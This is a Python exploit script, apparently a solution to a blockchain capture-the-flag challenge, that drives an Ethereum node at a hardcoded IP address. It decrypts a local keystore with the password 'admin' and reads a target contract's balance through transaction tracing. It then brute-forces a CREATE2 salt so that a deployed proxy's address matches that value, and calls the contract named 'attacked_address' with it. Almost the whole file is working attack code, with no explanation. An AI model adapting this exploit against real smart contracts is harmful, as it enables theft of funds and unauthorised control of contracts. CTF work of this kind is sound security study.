import json
import sys
import time

from web3 import Web3
from eth_account.messages import encode_defunct
from pwn import *
from solcx import compile_source
from pprint import pprint

IP = '121.36.221.84'
PORT = 8545
w3 = Web3(Web3.HTTPProvider(f'http://{IP}:{PORT}/'))

contract_address = "0x24ae5f4ccc4ae555381abe9c3c738ecebe66b0fd"

chain_id = w3.eth.chain_id
print("[I] Chain id: ", chain_id)

with open(
        '/home/ubuntu/.ethereum/keystore/UTC--2021-09-12T14-30-08.951791804Z--4fb4712a84a52b5a0316176f965125943264a8eb') as keyfile:
    encrypted_key = keyfile.read()
    private_key = w3.eth.account.decrypt(encrypted_key, 'admin')

message = encode_defunct(text='ASDF')
signed_message = w3.eth.account.sign_message(message, private_key=private_key)
message = encode_defunct(text="ASDF")
public_key = w3.eth.account.recover_message(message, signature=signed_message.signature)
print(f"public key: {public_key}")
print(requests.post(f"http://{IP}/api/", json={"address": public_key}).text)
print('-' * 12)


def estimate_gas(transaction):
    return w3.eth.estimate_gas(transaction, "latest")


def send_transaction(address, func, data):
    nonce = w3.eth.get_transaction_count(public_key)
    print("[I] Nonce fetched: ", nonce)
    transaction = {
        "nonce": nonce,
        "to": Web3.toChecksumAddress(address),
        "gas": 135168,
        'gasPrice': 0x100,
        "chainId": chain_id,
        "data": func + data,
    }
    signed_transaction = w3.eth.account.sign_transaction(transaction, private_key=private_key)
    transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction).hex()

    return transaction_hash


def create_contract(source):
    compiled_sol = compile_source(source)
    contract_id, contract_interface = compiled_sol.popitem()
    bytecode = contract_interface['bin']
    abi = contract_interface['abi']

    c = w3.eth.contract(abi=abi, bytecode=bytecode)

    return c.constructor(), abi


retriever, retriever_abi = create_contract(
    '''
pragma solidity >=0.7.0 <0.9.0;

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 */
contract Check {
    function retrieve(address other) public view returns (uint256){
        return other.balance;
    }
}
    '''
)

proxy, proxy_abi = create_contract(open("./proxy.sol", "r").read())
universal_proxy, universal_proxy_abi = create_contract(open("./universal_proxy.sol", "r").read())


def callContract(c, fname, *k):
    params = {
        "nonce": w3.eth.get_transaction_count(public_key),
        "gas": 335168,
        'gasPrice': 0x100,
        "chainId": chain_id,
    }

    f = getattr(c.functions, fname)
    tx = f(*k)
    tx = tx.buildTransaction(params)
    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    raw_tx = w3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
    return raw_tx


def deploy_contract(c):
    params = {
        "nonce": w3.eth.get_transaction_count(public_key),
        "gas": 335168,
        'gasPrice': 0x100,
        "chainId": chain_id,
    }
    tx = c.buildTransaction(params)
    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    return w3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()


def trace_tx(tx):
    trace = requests.post(f"http://{IP}:{PORT}", json={
        "jsonrpc": "2.0",
        "method": "debug_traceTransaction",
        "params": [tx],
        "id": 67
    })
    pprint(trace.json())
    return trace.json()


def wait_mined(tx):
    while True:
        try:
            receipt = w3.eth.get_transaction_receipt(tx)
            print(receipt)
            break
        except:
            time.sleep(1)

    return receipt

def find_salt(address, bytecode, balance):
    # keccak256( 0xff ++ address ++ salt ++ keccak256(bytecode))[12:] & 0xFFF == 0x900
    bytecode_plecak = Web3.solidityKeccak(['bytes'], [bytecode])
    print(hex(int.from_bytes(bytecode_plecak, 'big')))

    for s in range(0, 2 ** 32):
        ret = Web3.solidityKeccak(
            ['bytes1', 'address', 'uint256', 'bytes32'],
            [b'\xff', Web3.toChecksumAddress(address[2:]), s, bytecode_plecak]
        )
        reti = int.from_bytes(ret, 'big')
        ret_v = reti & 0xFFF
        if ret_v == balance:
            print(f"found salt {s, hex(reti)}")
            return s, hex(reti)


attacked_address = '0x6FE61a74847EA211626907968E9D609490eB663B'

retriever_create_tx = deploy_contract(retriever)
receipt = wait_mined(retriever_create_tx)
c = w3.eth.contract(abi=retriever_abi, address=receipt['contractAddress'])

call_contract_tx = callContract(c, 'retrieve', attacked_address)
wait_mined(call_contract_tx)
gas_trace = trace_tx(call_contract_tx)
code = w3.eth.get_code(attacked_address, 'latest')

structLogs = gas_trace['result']['structLogs']
for i, v in enumerate(structLogs):
    if v['op'] == 'BALANCE':
        print(structLogs[i+1])
        found_balance = int(structLogs[i+1]['stack'][-1], 16)
        break


proxy_create_tx = deploy_contract(proxy)
receipt = wait_mined(proxy_create_tx)
proxy_contract_addr = receipt['contractAddress']
# trace_tx(proxy_create_tx)

found_salt, newAddr = find_salt(proxy_contract_addr, universal_proxy.bytecode, found_balance)

c = w3.eth.contract(abi=proxy_abi, address=proxy_contract_addr)
tx = callContract(c, 'deploy', universal_proxy.bytecode, found_salt)
wait_mined(tx)
# trace_tx(tx)

tx_ = send_transaction(attacked_address, '4B64E492', newAddr[2:])
wait_mined(tx_)
# trace_tx(tx_)
print(tx_)


